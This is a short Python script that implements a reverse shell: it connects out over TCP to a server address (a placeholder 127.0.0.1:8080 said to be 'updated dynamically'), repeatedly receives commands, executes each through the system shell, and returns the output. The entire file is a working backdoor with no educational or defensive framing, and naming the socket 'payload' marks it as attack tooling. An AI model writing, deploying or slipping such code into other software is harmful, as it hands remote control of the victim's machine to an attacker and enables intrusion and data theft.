import socket
import subprocess

def connect_to_server():
    # Create a socket object using IPv4 and TCP/IP
    payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the server at the specified IP address and port
        payload.connect(("127.0.0.1", 8080))  # Default values, will be updated dynamically

        while True:
            # Receive the command from the server (up to 2048 bytes)
            cmd = payload.recv(2048)

            # Decode the received command from bytes to a UTF-8 string
            cmd = cmd.decode('utf-8')

            # Execute the command using subprocess and get the output
            output = subprocess.check_output(cmd, shell=True)

            # Send the output back to the server
            payload.send(output)

    except Exception as e:
        # Handle any exceptions that might occur during execution
        print(f"Error: {e}")

    finally:
        # Close the socket to release the resources
        payload.close()

if __name__ == "__main__":
    connect_to_server()
